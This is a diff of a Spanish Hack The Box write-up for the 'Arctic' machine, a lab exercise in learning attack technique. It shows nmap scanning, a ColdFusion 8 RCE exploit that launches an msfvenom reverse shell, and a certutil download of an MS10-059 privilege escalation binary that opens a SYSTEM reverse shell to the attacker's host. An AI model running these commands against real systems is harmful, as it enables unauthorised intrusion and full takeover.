@@ -18,6 +18,7 @@ tags:
   - Remote Command Execution (RCE) 
   - RCE - CVE-2009-2265
   - Reverse Shell
+  - System Recognition (Windows)
   - Local Privilege Escalation (LPE) 
   - LPE - MS10-059
   - OSCP Style
@@ -25,7 +26,15 @@ tags:
 ![](/assets/images/htb-writeup-artic/artic_logo.png)
 Una máquina algo sencilla, vamos a vulnerar el servicio **Adobe ColdFusion 8** usando el Exploit **CVE-2009-2264** que nos conectara directamente a la máquina usando una **Reverse Shell**, entraremos como usuario y usaremos el **MS10-059** para ganar acceso como **NT Authority System**.
 
-ADVERTENCIA, esta máquina es bastante lenta, en su momento me desespere, pero "la paciencia es la madre de la ciencia", advertido estas.
+**ADVERTENCIA**:
+Esta máquina es bastante lenta, en su momento me desespere, pero *"la paciencia es la madre de la ciencia"*, advertido estas.
+
+Herramientas utilizadas:
+* *nmap*
+* *python*
+* *nc*
+* *windows-exploit-suggester.py*
+* *certutil.exe*
 
 
 <br>
@@ -38,10 +47,11 @@ ADVERTENCIA, esta máquina es bastante lenta, en su momento me desespere, pero "
 				<li><a href="#Ping">Traza ICMP</a></li>
 				<li><a href="#Puertos">Escaneo de Puertos</a></li>
 				<li><a href="#Servicios">Escaneo de Servicios</a></li>
+				<li><a href="#Investigacion">Investigación de Servicios</a></li>
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#Investigacion">Investigación de Servicios</a></li>
+				<li><a href="#Investigacion2">Entrando al Protocolo FMTP desde la Web</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
@@ -52,6 +62,7 @@ ADVERTENCIA, esta máquina es bastante lenta, en su momento me desespere, pero "
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 				<ul>
+					<li><a href="#Enum">Enumeración de Máquina</a></li>
 					<li><a href="#PruebaExp2">Probando Exploit: MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799)</a></li>
 				</ul>
 		<li><a href="#Otras">Otras Formas</a></li>
@@ -79,7 +90,7 @@ ADVERTENCIA, esta máquina es bastante lenta, en su momento me desespere, pero "
 <h2 id="Ping">Traza ICMP</h2>
 
 Realizamos un ping para saber si la máquina está conectada y en base al TTL sabremos que SO ocupa la máquina.
-```
+```bash
 ping -c 4 10.10.10.11   
 PING 10.10.10.11 (10.10.10.11) 56(84) bytes of data.
 64 bytes from 10.10.10.11: icmp_seq=1 ttl=127 time=131 ms
@@ -95,7 +106,7 @@ Al parecer la máquina usa Windows. Es momentos de hacer los escaneos de puertos
 
 <h2 id="Puertos">Escaneo de Puertos</h2>
 
-```
+```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.11 -oG allPorts
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 13:43 CST
@@ -117,20 +128,23 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 27.54 seconds
            Raw packets sent: 131086 (5.768MB) | Rcvd: 30 (1.316KB)
 ```
-* -p-: Para indicarle un escaneo en ciertos puertos.
-* --open: Para indicar que aplique el escaneo en los puertos abiertos.
-* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
-* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
-* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
-* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
-* -Pn: Para indicar que se omita el descubrimiento de hosts.
-* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
+| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
+| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
+| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
+| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
+| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
+| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
+| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
 
 Solamente hay 2 puertos activos y que yo recuerde no nos hemos enfrentado a esos dos, hagamos el escaneo de servicios.
 
 <h2 id="Servicios">Escaneo de Servicios</h2>
 
-```
+```bash
 nmap -sC -sV -p135,8500 10.10.10.11 -oN targeted                        
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 13:45 CST
 Nmap scan report for 10.10.10.11
@@ -144,12 +158,35 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 138.29 seconds
 ```
-* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
-* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
-* -p: Para indicar puertos específicos.
-* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-Mmmmmm a kbron, no pues no nos dio mucha información que digamos. Vamos a investigar.
+| Parámetros | Descripción |
+|--------------------------|
+| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
+| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
+| *-p*       | Para indicar puertos específicos. |
+| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
+
+No nos dio mucha información que digamos. Vamos a investigar los servicios.
+
+<h2 id="Investigacion">Investigación de Servicios</h2>
+
+Vamos a empezar por el **MSRPC**:
+
+| **Protocolo MS-RPC** |
+|:-----------:|
+| *El protocolo de Llamada a Procedimiento Remoto de Microsoft (MSRPC), es un modelo cliente-servidor que permite a un programa solicitar un servicio de un programa ubicado en otra computadora, sin entender los detalles de la red, se derivó inicialmente de software de código abierto y posteriormente fue desarrollado y protegido por derechos de autor por Microsoft. El mapeador de puntos finales de RPC se puede acceder a través de los puertos TCP y UDP 135, SMB en TCP 139 y 445 (con una sesión nula o autenticada), y como un servicio web en el puerto TCP 593. MS-RPC se deriva de la implementación de referencia (V1.1) del protocolo RPC en el núcleo del entorno informático distribuido.* |
+
+<br>
+
+De momento, no creo que sea una opción atacar este puerto. Veamos que es el **protocolo FMTP**:
+
+| **Protocolo FMTP** |
+|:-----------:|
+| *Flight Message Transfer Protocol (FMTP) es una pila de comunicación basada en los protocolos de control de transmisión e Internet (TCP/IP). Se utiliza en un contexto de comunicación de igual a igual para el intercambio de información entre sistemas de tratamiento de datos de vuelo con fines de notificación, coordinación y transferencia de vuelos entre dependencias de control del tráfico aéreo y con fines de cooperación civil-militar.*|
+
+<br>
+
+Orale, es un protocolo interesante, es muy similar al **protocolo SMTP** y resulta implementa una página web. Vamos a investigar esta página.
 
 
 <br>
@@ -164,21 +201,16 @@ Mmmmmm a kbron, no pues no nos dio mucha información que digamos. Vamos a inves
 <br>
 
 
-<h2 id="Investigacion">Investigación de Servicios</h2>
+<h2 id="Investigacion2">Entrando al Protocolo FMTP desde la Web</h2>
 
-Vamos a empezar por el **FMTP**:
 
-**El SMTP o protocolo simple de transferencia de correo es un protocolo de red básico que permite que los emails viajen a través de internet. Es decir, es un protocolo de mensajería empleado para mandar un email de un punto A (un servidor de origen o servidor saliente) a un punto B (un servidor de destino o servidor entrante).**
-
-**Un servidor SMTP es un ordenador encargado de llevar a cabo el servicio SMTP, que haciendo las veces de “cartero electrónico”, permite el transporte del correo electrónico por Internet.**
-
-Ósea que es una página web, vamos a verla:
+Entremos:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-artic/Captura1.png">
 </p>
 
-Hay solamente 2 carpetas, veamos que hay en la primera:
+Hay solamente 2 directorios, veamos que hay en el primero:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-artic/Captura2.png">
@@ -196,9 +228,13 @@ No hay nada que sea de interés que yo sepa, entonces vamos al directorio **admi
 
 Ok, ya tenemos un servicio más especifico, pero ¿qué es eso de **Adobe ColdFusion**? Investiguemos:
 
-**Coldfusion es una plataforma de desarrollo rápido de aplicaciones web que usa el lenguaje de programación CFML. En este aspecto, es un producto similar a ASP, JSP o PHP. ColdFusion es una herramienta que corre en forma concurrente con la mayoría de los servidores web de Windows, Mac OS X, Linux y Solaris.**
+| **Adobe ColdFusion** |
+|:-----------:|
+| *Coldfusion es una plataforma de desarrollo rápido de aplicaciones web que usa el lenguaje de programación CFML. En este aspecto, es un producto similar a ASP, JSP o PHP. ColdFusion es una herramienta que corre en forma concurrente con la mayoría de los servidores web de Windows, Mac OS X, Linux y Solaris.* |
 
-Entonces, se esta desarrollando una aplicación web, por eso las credenciales que pide.
+<br>
+
+Entonces, se esta implementando una aplicación web, por eso las credenciales que pide. Vamos a buscar si hay un Exploit para este servicio.
 
 
 <br>
@@ -242,11 +278,14 @@ Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow'
 Shellcodes: No Results
 Papers: No Results
 ```
-Excelente, tenemos un RCE, vamos a analizarlo.
+Excelente, tenemos un **RCE**, vamos a analizarlo.
+
+<br>
 
 <h3 id="PruebaExp">Probando Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)</h3>
 
-```
+Copiemos el Exploit en nuestro espacio de trabajo:
+```bash
 searchsploit -x cfm/webapps/50057.py        
   Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
       URL: https://www.exploit-db.com/exploits/50057
@@ -255,8 +294,9 @@ searchsploit -x cfm/webapps/50057.py
  Verified: False
 File Type: Python script, ASCII text executable
 ```
-Analizándolo, nos pide los siguientes datos:
-```
+
+Analizándo el Exploit, nos pide los siguientes datos:
+```bash
 if __name__ == '__main__':
     # Define some information
     lhost = '10.10.16.4'
@@ -265,27 +305,30 @@ if __name__ == '__main__':
     rport = 8500
     filename = uuid.uuid4().hex
 ```
+
 Solamente tenemos que cambiarlos, eso me indica que este Exploit es usable para **Metasploit**. Pero checa esto:
-```
+```bash
 os.system(f'msfvenom -p java/jsp_shell_reverse_tcp
 ```
-Está generando un Payload para conectarnos a la máquina de manera remota. Vamos a probar el Exploit.
+Está generando un Payload para conectarnos a la máquina de manera remota. Vamos a probar el Exploit, así que vamos a configurarlo por pasos.
 
 * Cambiamos los datos:
-```
+```bash
     lhost = 'Tu_IP'
     lport = 443
     rhost = "10.10.10.11"
     rport = 8500
     filename = uuid.uuid4().hex
 ```
+
 * Levantamos una netcat:
-```
+```bash
 nc -nvlp 443    
 listening on [any] 443 ...
 ```
+
 * Y activamos el Exploit:
-```
+```bash
 python Adobe_Exploit.py                                                          
 Generating a payload...
 Payload size: 1496 bytes
@@ -298,8 +341,9 @@ Content-Disposition: form-data; name="newfile"; filename="f01dfac413bd448a82db88
 Content-Type: text/plain
 ...
 ```
-* Tardo un poco pero ya estamos dentro:
-```
+
+* Tardo bastante, pero ya estamos dentro:
+```bash
 nc -nvlp 443    
 listening on [any] 443 ...
 connect to [10.10.14.14] from (UNKNOWN) [10.10.10.11] 49408
@@ -309,6 +353,7 @@ C:\ColdFusion8\runtime\bin>whoami
 whoami
 arctic\tolis
 ```
+
 La flag del usuario se encuentra en el directorio **tolis**:
 ```
 C:\Users>dir
@@ -338,8 +383,10 @@ dir
 <br>
 
 
+<h2 id="Enum">Enumeración de Máquina</h2>
+
 Bueno ya estamos dentro, vamos a ver de qué nos podemos aprovechar para poder ganar acceso como Root.
-```
+```shell
 C:\>cd Program Files
 cd Program Files
 C:\Program Files>dir
@@ -376,8 +423,10 @@ dir
 C:\Program Files (x86)>cd ..
 cd ..
 ```
-Pues no hay que sepa que podamos usar, veamos que privilegios tenemos:
-```
+Pues no hay que sepa que podamos usar. 
+
+Veamos que privilegios tenemos:
+```shell
 C:\>whoami /priv
 whoami /priv
 
@@ -391,8 +440,10 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeCreateGlobalPrivilege       Create global objects                     Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
-Uffff tenemos el **SeImpersonatePrivilege** podemos aprovecharnos de ese, pero vamos a usar la herramienta **Windows Exploit Suggester** a ver que nos dice. Recuerda que vamos a necesitar la información del sistema, usa el comando **systeminfo** y copia todo en un archivo **.txt**.
-```
+Tenemos el **SeImpersonatePrivilege** podemos aprovecharnos de ese, pero vamos a usar la herramienta **Windows Exploit Suggester** a ver que nos dice. 
+
+Recuerda que vamos a necesitar la información del sistema, usa el comando **systeminfo** y copia todo en un archivo **.txt**.
+```shell
 python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.txt
 [*] initiating winsploit version 3.3...
 [*] database file detected as xls or xlsx based on extension
@@ -420,6 +471,8 @@ python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.t
 ```
 Hay varios Exploits que podemos usar, vamos a usar el **MS10-059** para poder ganar acceso como Root.
 
+<br>
+
 <h3 id="PruebaExp2">Probando Exploit: MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799)</h3>
 
 Para descargarlo, usaremos el siguiente link:
@@ -429,12 +482,13 @@ Para descargarlo, usaremos el siguiente link:
 Una vez descargado, lo pasamos a nuestro directorio de trabajo y lo vamos a subir a la máquina para activarlo, vámonos por pasos:
 
 * Abrimos un servidor con Python:
-```
+```bash
 python3 -m http.server                                                                     
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
+
 * Nos vamos a la carpeta **Temp** y creamos la carpeta **Privesc** para guardar ahí el Exploit:
-```
+```shell
 c:\>cd Windows/Temp
 cd Windows/Temp
 c:\Windows\Temp>dir
@@ -447,8 +501,9 @@ mkdir Privesc
 c:\Windows\Temp>cd Privesc
 cd Privesc
 ```
+
 * Descargamos el Exploit desde la máquina usando **certutil.exe**:
-```
+```shell
 c:\Windows\Temp\Privesc>certutil.exe -urlcache -split -f http://10.10.14.14:8000/MS10-059.exe MS10-059.exe
 certutil.exe -urlcache -split -f http://10.10.14.14:8000/MS10-059.exe MS10-059.exe
 ****  Online  ****
@@ -456,19 +511,22 @@ certutil.exe -urlcache -split -f http://10.10.14.14:8000/MS10-059.exe MS10-059.e
   0bf800
 CertUtil: -URLCache command completed successfully.
 ```
+
 * Levantamos una netcat:
-```
+```bash
 nc -nvlp 1337     
 listening on [any] 1337 ...
 ```
+
 * Activamos el exploit:
-```
+```shell
 c:\Windows\Temp\Privesc>MS10-059.exe 10.10.14.14 1337
 MS10-059.exe 10.10.14.14 1337
 /Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
 ```
+
 * ¡Y listo!, ya solamente buscamos la flag en el directorio **Administrator** y listo:
-```
+```bash
 nc -nvlp 1337     
 listening on [any] 1337 ...
 connect to [10.10.14.14] from (UNKNOWN) [10.10.10.11] 49790
@@ -492,6 +550,10 @@ nt authority\system
 <br>
 
 
+La verdad esta máquina se me hizo algo pesada, porque es muy tardado el uso de los servicios que esta usando, lo que te puede llegar a aburrir y frustrar, pero no te desesperes, pues puede que algún día te toque auditar servicios así de lentos. Veamos que otra cosa se puede probar.
+
+<br>
+
 <h3 id="PruebaExp3">Prueba Exploit: Adobe ColdFusion - Directory Traversal</h3>
 
 Existe otra forma de acceder a la máquina como usuario, para esto usaríamos el Exploit **Adobe ColdFusion - Directory Traversal**.
@@ -502,6 +564,7 @@ En el siguiente link, te explica cómo puedes obtener las credenciales para acce
 
 Este link viene en dicho Exploit: **CVE-2010-2861**
 
+<br>
 
 <h3 id="PruebaExp4">Prueba Exploit: Juicy Potato</h3>
 
@@ -512,7 +575,7 @@ Después de usar el **Windows Exploit Suggester**, intente probar algunos Exploi
 
 El último lo utilizamos en la **máquina Devel** pero aquí no funciono ni ese ni los otros que liste. Quizá a ti te funcionen, pruébalos si tienes tiempo y si no pues ve a lo seguro.
 
-He notado que otras personan han usado **Juicy Potato** o **Churraskito** que es una variante o el mismo que el **MS10-059**, no lo sé bien, aunque yo no probe **Juicy Potato** puedes intentarlo tu.
+He notado que otras personan han usado **Juicy Potato** o **Churraskito** que es una variante o el mismo que el **MS10-059**, no lo sé bien, aunque yo no probe **Juicy Potato** puedes intentarlo tú.
 
 
 <br>
